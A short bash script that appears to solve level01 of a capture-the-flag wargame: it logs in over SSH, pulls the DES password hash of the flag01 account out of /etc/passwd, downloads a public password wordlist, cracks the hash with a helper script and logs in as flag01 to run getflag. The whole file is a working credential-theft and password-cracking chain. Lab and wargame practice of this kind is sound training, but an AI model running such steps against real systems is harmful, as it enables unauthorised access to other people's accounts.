#!/usr/bin/env bash

set -euo pipefail

PARENT_DIR="$(dirname "$0")"
UTILS_DIR="$PARENT_DIR/../utils"

PATH="$UTILS_DIR:$PATH"

which wget >/dev/null || (echo "$0: You need to install wget using your packet manager!" >&2 && exit 1)

WORDLIST_URL="https://download.openwall.net/pub/wordlists/passwords/password.gz"

host="$1"
port="$2"
pass="$3"

des_hash="$(sshexec.sh "$host" "$port" level01 "$pass" "grep 'flag01' /etc/passwd | cut -d':' -f2")"

pass="$(wget -qO- "$WORDLIST_URL" | gunzip | des_crack.pl "$des_hash" "${des_hash:0:2}")"

sshexec.sh "$host" "$port" flag01 "$pass" getflag
